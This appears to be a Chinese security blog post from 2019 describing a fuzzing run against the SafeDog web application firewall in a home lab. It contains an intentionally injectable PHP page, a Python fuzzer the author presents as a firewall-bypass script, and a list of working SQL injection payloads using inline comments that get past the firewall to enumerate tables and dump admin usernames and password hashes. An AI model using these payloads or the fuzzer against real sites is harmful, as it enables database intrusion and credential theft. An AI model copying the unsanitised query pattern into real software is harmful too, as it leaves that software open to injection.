@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="测试环境：安全狗(APACHE正式版) V4.0 Windows Server 2003 Phpstudy Mysql /这里的安全狗要关闭下CC防护，不然ip会被ban掉/ 测试脚本：sqlTest.php test.sql  测试的这个安全狗是去年9月份搭建的，不晓得是不是最新版本，但大体都是一样的，跑个脚本就完事了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对安全狗的一次 FUZZ测试">
+<meta property="og:url" content="http://yoursite.com/2019/01/18/killsafedog/index.html">
+<meta property="og:site_name" content="Sriracha :)">
+<meta property="og:description" content="测试环境：安全狗(APACHE正式版) V4.0 Windows Server 2003 Phpstudy Mysql /这里的安全狗要关闭下CC防护，不然ip会被ban掉/ 测试脚本：sqlTest.php test.sql  测试的这个安全狗是去年9月份搭建的，不晓得是不是最新版本，但大体都是一样的，跑个脚本就完事了">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/01/18/killsafedog/result.png">
+<meta property="og:updated_time" content="2019-07-23T03:22:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="对安全狗的一次 FUZZ测试">
+<meta name="twitter:description" content="测试环境：安全狗(APACHE正式版) V4.0 Windows Server 2003 Phpstudy Mysql /这里的安全狗要关闭下CC防护，不然ip会被ban掉/ 测试脚本：sqlTest.php test.sql  测试的这个安全狗是去年9月份搭建的，不晓得是不是最新版本，但大体都是一样的，跑个脚本就完事了">
+<meta name="twitter:image" content="http://yoursite.com/2019/01/18/killsafedog/result.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sriracha :)" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/18/killsafedog/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>对安全狗的一次 FUZZ测试 | Sriracha :)</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sriracha :)</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Wow, the smell is great!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-pentest">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Pentest" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>渗透测试</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-audit">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Audit" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>代码审计</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-python">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Python" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Python</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about_me">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/About_Me" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>关于我</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-weapon">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/weapon" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Weapon</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/18/killsafedog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">对安全狗的一次 FUZZ测试
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-18 19:11:47" itemprop="dateCreated datePublished" datetime="2019-01-18T19:11:47+08:00">2019-01-18</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-07-23 11:22:10" itemprop="dateModified" datetime="2019-07-23T11:22:10+08:00">2019-07-23</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>测试环境：安全狗(APACHE正式版) V4.0 Windows Server 2003 Phpstudy Mysql</li>
+<li>/<em>这里的安全狗要关闭下CC防护，不然ip会被ban掉</em>/</li>
+<li>测试脚本：sqlTest.php test.sql</li>
+</ul>
+<p>测试的这个安全狗是去年9月份搭建的，不晓得是不是最新版本，但大体都是一样的，跑个脚本就完事了<br><a id="more"></a><br><strong>sqlTest.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id = @$_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line">if( !isset($id)|| empty($id) )&#123;</span><br><span class="line">    exit(&apos;get.id 参数不能为空&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    $dsn = &quot;mysql:host=127.0.0.1; port=3306; dbname=test; charset=utf8&quot;;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    $user = &apos;root&apos;;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    $psw =&apos;root&apos;; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    $pdo = new PDO($dsn,$user,$psw);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    $sql = &quot;select * from tdb_goods where goods_id = $id&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">    echo &apos;&lt;br/&gt;&apos;;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    $res = $pdo-&gt;query($sql) or var_dump($pdo-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    $mon = $res-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( $mon );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    print $e-&gt;getMessage();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>test.sql</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">-- MySQL dump 10.13  Distrib 5.5.40, for Win32 (x86)</span><br><span class="line">--</span><br><span class="line">-- Host: localhost    Database: test</span><br><span class="line">-- ------------------------------------------------------</span><br><span class="line">-- Server version	5.5.40</span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;</span><br><span class="line">/*!40103 SET TIME_ZONE=&apos;+00:00&apos; */;</span><br><span class="line">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&apos;NO_AUTO_VALUE_ON_ZERO&apos; */;</span><br><span class="line">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table `tdb_admin`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `tdb_admin`;</span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `tdb_admin` (</span><br><span class="line">  `id` int(11) NOT NULL,</span><br><span class="line">  `username` varchar(30) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  `password` varchar(32) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table `tdb_admin`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES `tdb_admin` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `tdb_admin` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `tdb_admin` VALUES (1,&apos;admin&apos;,&apos;7fef6171469e80d32c0559f88b377245&apos;);</span><br><span class="line">/*!40000 ALTER TABLE `tdb_admin` ENABLE KEYS */;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table `tdb_goods`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `tdb_goods`;</span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `tdb_goods` (</span><br><span class="line">  `goods_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `goods_name` varchar(150) NOT NULL,</span><br><span class="line">  `goods_cate` varchar(40) NOT NULL,</span><br><span class="line">  `brand_name` varchar(40) NOT NULL,</span><br><span class="line">  `goods_price` decimal(15,3) unsigned NOT NULL DEFAULT &apos;0.000&apos;,</span><br><span class="line">  `is_show` tinyint(1) NOT NULL DEFAULT &apos;1&apos;,</span><br><span class="line">  `is_saleoff` tinyint(1) NOT NULL DEFAULT &apos;0&apos;,</span><br><span class="line">  PRIMARY KEY (`goods_id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table `tdb_goods`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES `tdb_goods` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `tdb_goods` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `tdb_goods` VALUES (1,&apos;R510VC 15.6英寸笔记本&apos;,&apos;笔记本&apos;,&apos;华硕&apos;,3399.000,1,0),(2,&apos;Y400N 14.0英寸笔记本电脑&apos;,&apos;笔记本&apos;,&apos;联想&apos;,4899.000,1,0),(3,&apos;G150TH 15.6英寸游戏本&apos;,&apos;游戏本&apos;,&apos;雷神&apos;,8499.000,1,0),(4,&apos;X550CC 15.6英寸笔记本&apos;,&apos;笔记本&apos;,&apos;华硕&apos;,2799.000,1,0),(5,&apos;X240(20ALA0EYCD) 12.5英寸超极本&apos;,&apos;超级本&apos;,&apos;联想&apos;,4999.000,1,0),(6,&apos;U330P 13.3英寸超极本&apos;,&apos;超级本&apos;,&apos;联想&apos;,4299.000,1,0),(7,&apos;SVP13226SCB 13.3英寸触控超极本&apos;,&apos;超级本&apos;,&apos;索尼&apos;,7999.000,1,0),(8,&apos;iPad mini MD531CH/A 7.9英寸平板电脑&apos;,&apos;平板电脑&apos;,&apos;苹果&apos;,1998.000,1,0),(9,&apos;iPad Air MD788CH/A 9.7英寸平板电脑 （16G WiFi版）&apos;,&apos;平板电脑&apos;,&apos;苹果&apos;,3388.000,1,0),(10,&apos; iPad mini ME279CH/A 配备 Retina 显示屏 7.9英寸平板电脑 （16G WiFi版）&apos;,&apos;平板电脑&apos;,&apos;苹果&apos;,2788.000,1,0),(11,&apos;IdeaCentre C340 20英寸一体电脑 &apos;,&apos;台式机&apos;,&apos;联想&apos;,3499.000,1,0),(12,&apos;Vostro 3800-R1206 台式电脑&apos;,&apos;台式机&apos;,&apos;戴尔&apos;,2899.000,1,0),(13,&apos;iMac ME086CH/A 21.5英寸一体电脑&apos;,&apos;台式机&apos;,&apos;苹果&apos;,9188.000,1,0),(14,&apos;AT7-7414LP 台式电脑 （i5-3450四核 4G 500G 2G独显 DVD 键鼠 Linux ）&apos;,&apos;台式机&apos;,&apos;宏碁&apos;,3699.000,1,0),(15,&apos;Z220SFF F4F06PA工作站&apos;,&apos;服务器/工作站&apos;,&apos;惠普&apos;,4288.000,1,0),(16,&apos;PowerEdge T110 II服务器&apos;,&apos;服务器/工作站&apos;,&apos;戴尔&apos;,5388.000,1,0),(17,&apos;Mac Pro MD878CH/A 专业级台式电脑&apos;,&apos;服务器/工作站&apos;,&apos;苹果&apos;,28888.000,1,0),(18,&apos; HMZ-T3W 头戴显示设备&apos;,&apos;笔记本配件&apos;,&apos;索尼&apos;,6999.000,1,0),(19,&apos;商务双肩背包&apos;,&apos;笔记本配件&apos;,&apos;索尼&apos;,99.000,1,0),(20,&apos;X3250 M4机架式服务器 2583i14&apos;,&apos;服务器/工作站&apos;,&apos;IBM&apos;,6888.000,1,0),(21,&apos;玄龙精英版 笔记本散热器&apos;,&apos;笔记本配件&apos;,&apos;九州风神&apos;,0.000,1,0),(22,&apos; HMZ-T3W 头戴显示设备&apos;,&apos;笔记本配件&apos;,&apos;索尼&apos;,6999.000,1,0),(23,&apos;商务双肩背包&apos;,&apos;笔记本配件&apos;,&apos;索尼&apos;,99.000,1,0);</span><br><span class="line">/*!40000 ALTER TABLE `tdb_goods` ENABLE KEYS */;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2019-01-18 13:08:24</span><br></pre></td></tr></table></figure></p>
+<p>FUZZ思路：安全狗的拦截是根据正则表达式匹配的，那么我们可以根据Mysql数据库的特征(内联注释，换行符等)，加上一些常用的符号组合成payload对其进行FUZZ</p>
+<p><strong>Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0；</strong></p>
+<p>fuzz.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">#过狗脚本，自行验证</span><br><span class="line">#python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">fuzz_zs = [&apos;/*&apos;,&apos;*/&apos;,&apos;/*!&apos;,&apos;/**/&apos;,&apos;?&apos;,&apos;/&apos;,&apos;*&apos;,&apos;=&apos;,&apos;`&apos;,&apos;!&apos;,&apos;%&apos;,&apos;_&apos;,&apos;-&apos;,&apos;+&apos;]</span><br><span class="line">fuzz_sz = [&apos;&apos;]</span><br><span class="line">fuzz_ch = [&quot;%09&quot;,&quot;%0a&quot;,&quot;%0b&quot;,&quot;%0c&quot;,&quot;%0d&quot;,&quot;%20&quot;,&quot;%a0&quot;]</span><br><span class="line"></span><br><span class="line">fuzz = fuzz_zs+fuzz_ch+fuzz_sz</span><br><span class="line">headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;&#125;</span><br><span class="line">url_start = &quot;http://192.168.79.129/sqltest.php?id=1&quot;</span><br><span class="line"></span><br><span class="line">len = len(fuzz)**5</span><br><span class="line">num = 0</span><br><span class="line">for a in fuzz:</span><br><span class="line">	for b in fuzz:</span><br><span class="line">		for c in fuzz:</span><br><span class="line">			for d in fuzz:</span><br><span class="line">				for e in fuzz:</span><br><span class="line">					num += 1</span><br><span class="line">					payload = &quot;/*!union&quot;+a+b+c+d+e+&quot;select*/ 1,2,3,4,5,6,7&quot;</span><br><span class="line">					url = url_start + payload</span><br><span class="line">					sys.stdout.write(&apos; &apos;*30 +&apos;\r&apos;)</span><br><span class="line">					sys.stdout.flush()</span><br><span class="line">					print(&quot;Now URL:&quot;+url)</span><br><span class="line">					sys.stdout.write(&quot;完成进度:%s/%s \r&quot; %(num,len))</span><br><span class="line">					sys.stdout.flush()</span><br><span class="line">					res = requests.get(url = url,headers = headers)</span><br><span class="line">					if &quot;Array&quot; in res.text:</span><br><span class="line">						with open (&quot;Results.txt&quot;,&apos;a&apos;) as r:</span><br><span class="line">							r.write(url+&quot;\n&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>运行脚本，要是能绕过安全狗，肯定不会是安全狗的防护页面啦，所以这里绕过成功的特征是看结果中是否有”Array”，要是绕过了的话就会将payload保存到Results.txt中，一不小心跑了一个小时，结果如下：<br><img src="/2019/01/18/killsafedog/result.png" alt><br>是不是惊呆了，居然有5000多个Payload</p>
+<p>那么我们再测试一下其他的吧，根据安全狗的正则，看能绕过哪些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1、and 1 拦截</span><br><span class="line"></span><br><span class="line">payload:&quot; and&quot;+a+b+c+d+e+&quot;1&quot;</span><br><span class="line">result:http://192.168.79.129/sqltest.php?id=1 and/*/**/-%201 Success</span><br><span class="line"></span><br><span class="line">2、and/*/**/-%20=1 拦截</span><br><span class="line">payload:&quot; and/*/**/-%201=&quot;+a+b+c+d+e+&quot;1&quot;</span><br><span class="line">result:http://192.168.79.129/sqltest.php?id=1 and/*/**/-%201=/*/**/-1 Success</span><br><span class="line"></span><br><span class="line">3、union select 拦截</span><br><span class="line">payload:&quot; union selec&quot;+a+b+c+d+e+&quot;t&quot; Fail</span><br><span class="line">payload:&quot; union&quot;+a+b+c+d+e+&quot;select&quot;	Fail</span><br><span class="line">跑了半个小时也没跑出一个，估计这种没辙了，要用我们上面的内联注释才有用吧</span><br><span class="line"></span><br><span class="line">4、/*!union/*/*=%0j/**/select*/ 1,user(),3,4,5,6,7 拦截</span><br><span class="line">payload:/*!union/*/*=%0j/**/select*/ 1,user(&quot;+a+b+c+d+e+&quot;),3,4,5,6,7</span><br><span class="line">这里文件里倒是写入了payload，但是再打开连接的时候居然还是被拦截了，看了源码、安全狗的配置都没问题呀。</span><br><span class="line"></span><br><span class="line">5、/*user()*/ 拦截</span><br><span class="line">上面的那种不行，于是就想到了添加注释符，然后，嘿，有了</span><br><span class="line">http://192.168.79.129/sqltest.php?id=-1/*!union/*/*=%0j/**/select*/%201,/*!user(/*/*/*//*!)*/,3,4,5,6,7 success</span><br><span class="line"></span><br><span class="line">http://192.168.79.129/sqltest.php?id=-1/*!union/*/*=%0j/**/select*/ 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=&apos;test&apos;</span><br><span class="line"></span><br><span class="line">http://192.168.79.129/sqltest.php?id=-1/*!union/*/*=%0j/**/select*/ 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=&apos;tdb_admin&apos;</span><br><span class="line"></span><br><span class="line">http://192.168.79.129/sqltest.php?id=-1/*!union/*/*=%0j/**/select*/ 1,2,3,4,5,6,group_concat(id,username,password) from tdb_admin</span><br><span class="line"></span><br><span class="line">后面都不拦截了，ok</span><br></pre></td></tr></table></figure></p>
